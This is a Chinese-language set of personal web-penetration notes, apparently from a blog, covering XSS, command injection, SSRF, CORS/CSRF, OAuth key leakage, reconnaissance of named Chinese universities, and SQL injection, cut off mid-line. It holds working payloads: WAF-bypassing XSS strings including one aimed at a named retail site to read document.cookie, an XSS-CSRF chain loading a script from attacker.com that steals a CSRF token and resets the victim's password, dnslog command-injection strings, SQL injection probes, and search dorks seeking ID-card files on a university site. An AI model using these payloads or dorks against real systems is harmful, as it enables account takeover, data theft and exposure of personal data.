反射xss/domxss 存储xss svg/html文件上传</span><br><span class="line"></span><br><span class="line">	postmessage</span><br><span class="line">		https://www.cnblogs.com/piaomiaohongchen/p/14727871.html</span><br><span class="line">	</span><br><span class="line">	案例</span><br><span class="line">        1.文件上传的文件名也可以xss 网页放入这个文件触发</span><br><span class="line">        content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">        2.绕waf</span><br><span class="line">            拼接 (特定情况)</span><br><span class="line">            拼接打乱发送的顺序</span><br><span class="line">            alert(1)---&gt;&gt;&gt;top[`aler`+`t`](1)</span><br><span class="line">        	(alert)(1);</span><br><span class="line">        	&amp;it;img src=1 onerror&amp;equals;top[`aler`+`t`](1)&amp;gt;</span><br><span class="line">        3.发送payload返回利用的地方可能不止一处</span><br><span class="line">        	有的地方被转义有的可能没有被转义</span><br><span class="line">        	要分析js代码看它返回的地方有几处利用 前后端分离了</span><br><span class="line">		4.经常有的domxss函数setTimeout eval function location innerHTML</span><br><span class="line">			function a()&#123;alert(1)&#125;a()</span><br><span class="line">			location=&quot;javascript:alert(1)&quot;</span><br><span class="line">			location=&quot;javascript://%0aalert(1)&quot;</span><br><span class="line">			var xxx = &quot;\u003cimg src=c onerror=alert(1)\u003e&quot;</span><br><span class="line">			document.createElement(&quot;div&quot;).innerHTML=&quot;&lt;svg&gt;&quot;+xxx+&quot;&lt;/svg&gt;&quot;</span><br><span class="line">		5.https://fr.shopping.rakuten.com/connect?url=123123%22%3E%3Cimg+src=x+onpointerrawupdate=(prompt)(document.cookie)%3E</span><br><span class="line">			国外网站首先第一步数据交互的地方要找到 可以用view-source搜索 构造闭合</span><br><span class="line">			检测哪些关键字被转义 被waf拦掉 准备一个字典</span><br><span class="line">				&lt;u&gt;123&lt;/u&gt; &lt;script&gt; &lt;img&gt;</span><br><span class="line">			&lt;img&gt;中的on事件准备一个字典 使用chatgpt构造一个字典</span><br><span class="line">				onsubmit：在表单提交之前执行。</span><br><span class="line">                onkeydown/onkeypress/onkeyup：在按下/按住/释放键盘上的按键时执行。</span><br><span class="line">                onblur：当元素失去焦点时执行。</span><br><span class="line">                onchange：当元素的值更改时执行（例如文本框或下拉列表）。</span><br><span class="line">                oncontextmenu：右键单击时执行。</span><br><span class="line">                ondblclick：双击鼠标时执行。</span><br><span class="line">                onmousedown/onmouseup：在鼠标按钮被按下/释放时执行。</span><br><span class="line">                oninput：当用户输入值时触发（适用于&lt;textarea&gt;和&lt;input&gt;元素）</span><br><span class="line">                onerror：在加载图像或其他媒体文件时出现错误时触发</span><br><span class="line">                onresize：当元素大小调整时触发</span><br><span class="line">                ondrag：在元素拖动期间触发</span><br><span class="line">                onscroll：在元素滚动时触发</span><br><span class="line">                onpointerrawupdate 事件是一个指针事件，它在指针移动或触摸设备接收到新的原始输入数据时触发。这个事件提供了一种机制来跟踪鼠标或者触摸屏幕上的手指在运动过程中的位置和状态。</span><br><span class="line">				onpointermove 事件仅在指针移动时触发</span><br><span class="line">			此处waf应该是检测 prompt() ,使用(prompt)()绕过	此处(alert)()也可</span><br><span class="line">				prompt()函数是JavaScript中的一个内置函数，它用于在弹出窗口中向用户请求输入数据。它有两个参数：一个是窗口中要显示的文本内容，另一个是可选的默认值。当弹出窗口打开时，用户可以在其中输入数据，并单击“确定”或“取消”按钮。</span><br><span class="line">        6.input标签中过滤&lt; &gt;</span><br><span class="line">            echo &#x27;&lt;input value=&quot;&#x27;.&#x27;$name&#x27;.&#x27;&quot;&gt;&#x27;;</span><br><span class="line">            &quot; onfocus=alert(1)//		双引号是闭合</span><br><span class="line">            &quot; onclick=alert(1) &quot;</span><br><span class="line">		echo模板输出 字符的// 没有注释的作用</span><br><span class="line">	</span><br><span class="line">        7.aa bb可控 被html实体转义(转义完基本不能在除了html代码里执行)html实体转义唯独没有转义反斜杠\</span><br><span class="line">        echo &quot;&lt;script&gt;var name=\&quot;$name\&quot;;var age=\&quot;$age\&quot;;&lt;/script&gt;&quot;</span><br><span class="line">            var name=&quot;aa&quot;;var age=&quot;bb&quot;		必须在一行</span><br><span class="line">            ?name=ccc\&amp;age=-alert(1)//</span><br><span class="line">                var name=&quot;ccc\&quot;;var age=&quot;-alert(1)//&quot;</span><br><span class="line">        8.echo &quot;&lt;script&gt;var name=`$name`&lt;/script&gt;&quot;;</span><br><span class="line">            ?name=`-alert(1)//</span><br><span class="line">        9.&lt;a href=&quot;a&quot;onfocus=alert(1) autofocus//&quot;&gt;a&lt;/a&gt;</span><br><span class="line">            a&quot;onfocus=alert(1) autofocus//</span><br><span class="line">            autofocus自动聚焦 打开alert</span><br><span class="line">        10.//setTimeout(&quot;alert(1)&quot;, 3000)		等待3秒后执行alert(1)</span><br><span class="line">            &lt;script&gt;setTimeout(&quot;console.log(\&#x27;&quot;+name+&quot;\&#x27;)&quot;, 100)&lt;/script&gt;</span><br><span class="line">            &#x27;)-alert(1)// </span><br><span class="line">            console.log(&#x27;&#x27;)-alert(1)//&#x27;)</span><br><span class="line">			eval(&quot;console.log(\&#x27;&quot;+name+&quot;\&#x27;)&quot;)</span><br><span class="line">		11.双引号里面的东西支持很多编码</span><br><span class="line">			&lt;a href=&quot;javascript&amp;#x3a;alert%281)&quot;&gt;a&lt;/a&gt;</span><br><span class="line">            </span><br><span class="line">    htmlentities($str, ENT_QUOTES)</span><br><span class="line">    	ENT_QUOTES转换单双引号</span><br><span class="line">    	ENT_COMPAT只转换单双引号</span><br><span class="line">    	ENT_NOQUOTES不转换任何引号</span><br><span class="line">    </span><br><span class="line">    svg</span><br><span class="line">		www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html</span><br><span class="line">	</span><br><span class="line">	chrome同源设置的狠</span><br><span class="line">	怎么挖</span><br><span class="line">        1.先寻找没有转义的地方</span><br><span class="line">        2.找到操作未转义参数的包</span><br><span class="line">        3.插入payload</span><br><span class="line">        4.bypass 触发xss</span><br><span class="line"></span><br><span class="line">	反射xss过一下后端映射到前端，domxss不过后端</span><br><span class="line">	在线客服</span><br></pre></td></tr></table></figure>

<h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上传点filename存在rce可能</span><br><span class="line">json中</span><br><span class="line">	&quot;filename&quot;:&quot;111.wave|ping `whoami`.xxx.dnslog.cn&quot;</span><br><span class="line">或者post传参中</span><br><span class="line">api接口中</span><br><span class="line">	GET /testapi/ping/192.168.5.1|`whoami`.xxx.dnslog.cn</span><br><span class="line">	GET /testapi/try_hear/123.wav|`whoami`.xxx.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pdf组件</span><br><span class="line">	很多平台都存在将网页导出为pdf文件进行下载功能。而pdf转换工具很容易产生漏洞</span><br><span class="line">	1.pdf一般是后端组件 有的开发可能配置错误 使用file协议进行利用</span><br><span class="line">	2.pdf组件由于自身的代码问题或者调用内置的浏览器存在问题导致漏洞</span><br><span class="line">	&lt;iframe&gt;标签 导出为pdf处 抓包或者断点</span><br><span class="line">		大黄蜂pdf到处导致ssrf 2分30案例没看懂</span><br></pre></td></tr></table></figure>

<h3 id="cors-csrf"><a href="#cors-csrf" class="headerlink" title="cors csrf"></a>cors csrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	cross-origin resource sharing跨域资源共享</span><br><span class="line">		对于给定域之外的资源进行受控访问</span><br><span class="line">	SOP same-origin policy 同源政策</span><br><span class="line">	</span><br><span class="line">	在返回获取session值 获取api-key的地方测试</span><br><span class="line">	请求包加入Origin:</span><br><span class="line">		原url--&gt;一定能成</span><br><span class="line">		别的网页</span><br><span class="line">		自己的域名前面是原url</span><br><span class="line">		原url的子域名存在xss</span><br><span class="line">		null</span><br><span class="line">	返回有两个</span><br><span class="line">		Access-Control-Allow-Origin:....</span><br><span class="line">		Access-Control-Allow-Credentials:True</span><br><span class="line"></span><br><span class="line">	csrf:让受害者在不知情情况下发出请求</span><br><span class="line">	burp制作poc</span><br><span class="line">		burp抓包-&gt;Engagement tools-&gt;Generate CSRF PoC</span><br><span class="line">	看到参数 删掉或者置空试试 删掉改传参方式</span><br><span class="line">	注销 账号接管这种危害可以领钱</span><br><span class="line">	利用面广 自己可以操作的地方就可以利用</span><br><span class="line">	csrf xss组合拳提高危害</span><br><span class="line">	csrf思路在于基础功底 如第三方登录整体逻辑 扫码登录逻辑 注销逻辑</span><br><span class="line">	案例</span><br><span class="line">		1.app和网页注销共享cookie? 只验证一方</span><br><span class="line">		2.抓包修改密码用的 PATCH</span><br><span class="line">		PATCH PUT DELETE无法利用csrf</span><br><span class="line">		但是可以POST _method=PATCH</span><br><span class="line">		PATCH传参可以用_method=PATCH</span><br><span class="line">	OAuth原理</span><br><span class="line">		https://blog.csdn.net/weixin_44763552/article/details/123741791</span><br><span class="line">	拦截微信授权那个包发送授权code那个包? csrf发给别人 别人访问了 相当于我接管了别人的账号</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// xss+csrf组合拳	都在服务方的域名上</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&#x27;....&#x27;</span>&gt;</span></span><br><span class="line">document.getElementsByTagName(&#x27;meta&#x27;)[&#x27;csrf-token&#x27;].content</span><br><span class="line"></span><br><span class="line">//js代码	%27--&gt;&gt;&#x27;   会把a写进html代码	这部分是xss插入的dom型</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">...</span> <span class="attr">href</span>=<span class="string">javaccript:eval(%27var</span> <span class="attr">a</span>=<span class="string">document.createElement(\%27script\%27));a.src</span>=<span class="string">\%27https://attacker.com/1.js;document.body.appendChild(a)%27)</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">//用户打开网址会访问到插入的xss 访问恶意脚本1.js</span><br><span class="line"></span><br><span class="line">//以下为1.js的内容</span><br><span class="line">var token=document.getElementsByTagName(&#x27;meta&#x27;)[&#x27;csrf-token&#x27;].content</span><br><span class="line">var httpRequest1 = new XMLHttpRequest()</span><br><span class="line">httpRequest1.open(&#x27;POST&#x27;, &#x27;https://test.com/reset&#x27;,true);</span><br><span class="line">httpRequest1.setRequest(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);//设置请求头</span><br><span class="line">httpRequest1.send(&quot;password=123456&amp;csrf_token&quot;+token)</span><br><span class="line">//用户自己发包修改了密码  该攻击手法不用考虑网站同源的问题</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">burp生成 修改json传参csrf 修改处如下 name处 enctype处</span><br><span class="line">	不能url编码 后端可能不解</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;....&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;a&quot;:&quot;dd&quot;,&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&quot;:1&#125;&#x27;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="oauth2-0-api安全"><a href="#oauth2-0-api安全" class="headerlink" title="oauth2.0 api安全"></a>oauth2.0 api安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">app反编译完</span><br><span class="line">	查找关键字 appid appkey appsecret secret oss bos access_key ak sk或者看规则写正则 云链接	(火线社区)</span><br><span class="line"></span><br><span class="line">返回包临时密钥一般登不上 aliyun的例外</span><br><span class="line"></span><br><span class="line">某个利用需自己复现</span><br><span class="line">腾讯云-&gt;临时密钥-&gt;临时密钥上传手册-&gt;上传脚本留下来-&gt;上传脚本覆盖站内资源----&gt;&gt;&gt;&gt;高危</span><br><span class="line"></span><br><span class="line">百度aksk脚本</span><br><span class="line">	某个第一期师傅写的</span><br><span class="line">	gui_baiduBOSzmozmo</span><br><span class="line">*/</span><br><span class="line">OAuth	一种授权机制</span><br><span class="line">    1.客户向授权服务器AS获取令牌</span><br><span class="line">    2.客户使用令牌向资源服务器获取api接口</span><br><span class="line">    3.客户使用api向资源拥有者</span><br><span class="line">appkey		api标号</span><br><span class="line">appsecret   api密钥</span><br><span class="line">redirecturl	回调地址</span><br><span class="line"></span><br><span class="line">查找ak/sk的方式</span><br><span class="line">	1.js代码泄露ak/sk</span><br><span class="line">		ctrl+shift+f	浏览器js api接口全文件查找</span><br><span class="line">	2.github仓库泄露ak/sk</span><br><span class="line">	3.app反编译</span><br><span class="line">		jadx-gui</span><br><span class="line">		批量 apk自动化化反编译脚本</span><br><span class="line">			目标放进target文件夹 执行auto.py</span><br><span class="line">	4.小程序反编译</span><br><span class="line">		pc 微信 wechatfile/applet</span><br><span class="line">			先用UnpackMiniApp解密-&gt;.wxapkg文件		--&gt;这个解密软件有蠕虫病毒Synaptics.exe</span><br><span class="line">		再用CrackApp对.wxapkg文件逆编译</span><br><span class="line">	5.返回包中回显ak/sk</span><br><span class="line">		HaE		burp插件正则匹配网页中的配置信息</span><br><span class="line">	6.其余配置文件中</span><br><span class="line">		spring框架重要文件heapdump利用 存在未授权尝试获取这个文件</span><br><span class="line">		https://blog.csdn.net/cdyunaq/article/details/123821962</span><br><span class="line">		https://github.com/wyzxxz/heapdump_tool</span><br><span class="line">	7.web.archive.org 2021年11月之前的网站很有用</span><br><span class="line"></span><br><span class="line">有回调地址--&gt;&gt;oauth2.0</span><br><span class="line">redirect_url进行csrf攻击 重定向到百度 被攻击者的百度需要登录状态</span><br><span class="line"></span><br><span class="line">开发者平台api	阅读各个开发者平台   阅读越多挖的越多</span><br><span class="line">	各个开发者平台如何获取code access_token secret</span><br><span class="line">	1.微信	developers.weixin.qq.com			腾讯akid</span><br><span class="line">	2.华为</span><br><span class="line">	3.百度	ai.baidu.com</span><br><span class="line">	4.阿里</span><br><span class="line">	5.京东</span><br><span class="line">	6.微博	open.weibo.com/wiki/%E5%BE%AE%E5%8D%9AAPI</span><br><span class="line"></span><br><span class="line">小程序的反编译获取到apikey secretkey如何利用</span><br><span class="line">	寻找哪个开发者平台</span><br><span class="line">		百度</span><br><span class="line">	看开发者平台提供的功能</span><br></pre></td></tr></table></figure>

<h1 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h1><h3 id="1-web安全之网站架构分析"><a href="#1-web安全之网站架构分析" class="headerlink" title="1.web安全之网站架构分析"></a>1.web安全之网站架构分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">遇到过哪些架构的网站</span><br><span class="line">thinkphp spring shiro springboot structs django flask dedecms</span><br><span class="line"></span><br><span class="line">模板输出</span><br><span class="line">	请求一个后端接口 后端返回一个渲染好的html代码</span><br><span class="line">	以静态资源的地址来访问 相对路径 绝对路径</span><br><span class="line">	php文件干了html的事儿		sqllab</span><br><span class="line">	sql注入可能性大 源码编写 并非框架全局拦截 导致有些不是很统一</span><br><span class="line">	目录扫描 目录固定 文件命名可猜解</span><br><span class="line">	</span><br><span class="line">前后端分离	---mysql主从复制</span><br><span class="line">	mvc / soa / 微服务</span><br><span class="line">	后端只需要通过接口发送json数据 前端根据这些数据来显示</span><br><span class="line">	1.前端页面是个独立站点</span><br><span class="line">	2.调用的往往是aa.test.com 页面站点			调用站点aa.test.com:8080/api/</span><br><span class="line">	url地址带# 静态页面	静态路径的分割和标识符</span><br><span class="line">	日后端</span><br><span class="line">	view-source:		出来是一行</span><br><span class="line">	利用方式</span><br><span class="line">		1.jsfinder	找接口  找未授权</span><br><span class="line">		2.找后台服务		看接口的调用地址</span><br><span class="line">		3.找后台地址</span><br><span class="line"></span><br><span class="line">js编译型</span><br><span class="line">	新技术的出现 node.js vue angular react</span><br><span class="line">	1.有些过程是抓不到包的 注入基本很少 原因：有些数据直接在内存里面调用了 sync.exec(&#x27;+1&#x27;)</span><br><span class="line">	2.node.js 存在问题 越权访问 各种地址目录猜解 原因：js文件都是能看见的</span><br><span class="line">	3.接口未授权 进程注入</span><br><span class="line">	</span><br><span class="line">js -&gt;typescript -&gt; node.js</span><br><span class="line">typescript支持解析js node来执行</span><br><span class="line">node.js是一个解释器 服务器</span><br><span class="line">typescript写的代码给node.js去解析编译 给浏览器执行</span><br></pre></td></tr></table></figure>

<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">多换搜索引擎</span><br><span class="line">    google search：</span><br><span class="line">    身份证</span><br><span class="line">        &quot;上海大学&quot; site:shu.edu.cn intext:&quot;身份证&quot; filetype:pdf|txt|ppt|pptx|xlsx|csv|tsv|xls</span><br><span class="line">    找资产</span><br><span class="line">        site:shu.edu.cn intext:&quot;登录&quot;|&quot;忘记密码&quot;|&quot;后台&quot;|&quot;管理&quot;|&quot;教务&quot;|&quot;教育平台&quot;|&quot;...&quot;</span><br><span class="line">github</span><br><span class="line">	shu.edu.cn password vpn</span><br><span class="line"></span><br><span class="line">fofa</span><br><span class="line">公众号 小程序</span><br><span class="line"></span><br><span class="line">edusrc 开发商排行榜 src.sjtu.edu.cn</span><br></pre></td></tr></table></figure>

<h3 id="3-证书站外围资产"><a href="#3-证书站外围资产" class="headerlink" title="3.证书站外围资产"></a>3.证书站外围资产</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">交大 电子科技大学 同济 上理 常熟 广工 上外 南开 东林 长春 上音</span><br><span class="line">//没有vpn的思路</span><br><span class="line">外围网站收集</span><br><span class="line">1.注册点</span><br><span class="line">2.边缘登录</span><br><span class="line">3.老破小</span><br><span class="line">4.小程序</span><br><span class="line">5.公众号</span><br><span class="line">6.院校类内部的小众系统</span><br><span class="line">//举例</span><br><span class="line">google</span><br><span class="line">			tongji.edu.cn &quot;登录&quot;</span><br><span class="line">			同济大学 &quot;后台管理&quot; &quot;登录&quot;		//找边缘资产</span><br><span class="line">			同济大学 &quot;系统&quot; &quot;登录&quot;</span><br><span class="line">			同济大学 &quot;管理系统&quot; &quot;登录&quot;</span><br><span class="line">	航天 设计 艺术 软件 学生系统//注册 后台 验证码 管理 找回密码</span><br><span class="line">fofa</span><br><span class="line">			&quot;同济大学&quot;&quot;登录&quot;</span><br><span class="line">钟馗之眼</span><br><span class="line">			同济大学 登录</span><br><span class="line">bing</span><br><span class="line">			同济大学 登录</span><br><span class="line">不同搜索引擎的关键字输入获得的信息是不一样的</span><br><span class="line"></span><br><span class="line">瞄准小程序 + 公众号</span><br><span class="line">小程序搜同济大学 一个个看</span><br><span class="line">公众号上面去找 抓包容易一些</span><br><span class="line">pc端和小程序端的接口 一般是分开来写的 也有一部分是公共调用的</span><br><span class="line">接口之间的异同 pc端和小程序的功能有可能是两套系统</span><br><span class="line">域名后面加个admin main home</span><br><span class="line"></span><br><span class="line">//钓鱼 社工 搞密码 搞账号的思路很多</span><br></pre></td></tr></table></figure>

<h3 id="4-edu站点思路尝试"><a href="#4-edu站点思路尝试" class="headerlink" title="4.edu站点思路尝试"></a>4.edu站点思路尝试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https://zone.huoxian.cn/d/226</span><br><span class="line">接口尝试的参数尝试使用fuzz进行爆破</span><br><span class="line">空白页可能是api服务端 盲猜接口或者fuzz</span><br><span class="line">每天留半小时看看文章 觉得不错试试总结一下</span><br><span class="line"></span><br><span class="line">外网</span><br><span class="line">登录注册 忘记密码(越权 注入情况很少 未授权从js中查看) 爆破很少 信息泄露</span><br><span class="line"></span><br><span class="line">进了内部</span><br><span class="line">1.找我的账号信息在哪 我的roleid 名字</span><br><span class="line">我的信息是通过接口返回的 页面直接写上去的</span><br><span class="line">	看看是否能越权</span><br><span class="line">	慢慢理解每个接口都干了什么事儿 要积累</span><br><span class="line">/api/menu/init</span><br><span class="line">/api/menu/userInfo		json数据包 html页面</span><br><span class="line"></span><br><span class="line">理解接口的含义 摒弃业务中的固定数据</span><br><span class="line">利用这个系统的权限规则</span><br><span class="line"></span><br><span class="line">文件上传</span><br><span class="line">从js找upload相关词的接口</span><br><span class="line">找业务上传点</span><br><span class="line">判断是否黑白名单</span><br><span class="line"></span><br><span class="line">内部系统可能存在不同于外部js的文件 接口其他的东西</span><br><span class="line"></span><br><span class="line">RCE版本框架漏洞 cms这种类型 搜百度</span><br><span class="line">构造报错 看能不能出线版本等其他信息</span><br><span class="line"></span><br><span class="line">xxe</span><br><span class="line">content-type:application/xml	或者数据包中返回了xml类型 此时可以去尝试构造</span><br></pre></td></tr></table></figure>

<h3 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">登录 表单 url参数 cookie header 搜索 注册</span><br><span class="line">任何输入与数据库交互的地方都可能存在sql注入</span><br><span class="line">常用的一些检测语句</span><br><span class="line">&#x27; or &#x27;1&#x27; = &#x27;1	用or注意数据库的逻辑</span><br><span class="line">&#x27; and 1=1#</span><br><span class="line">&#x27;and(select+sleep(0))a+union+select+1)=&#x27;</span><br><span class="line">&#x27;||1=1#			&#x27;||1=2#		(注意页面和数据包的变化) </span><br><span class="line">|1/(if(1=1,1,exp(710)))			判断mysql？？</span><br><span class="line"></span><br><span class="line">2022%&#x27;)|1/if(1=1,1,exp(710))|(&#x27;%</span><br><span class="line">keyword=2020&#x27;)|floor() version| %23</span><br><span 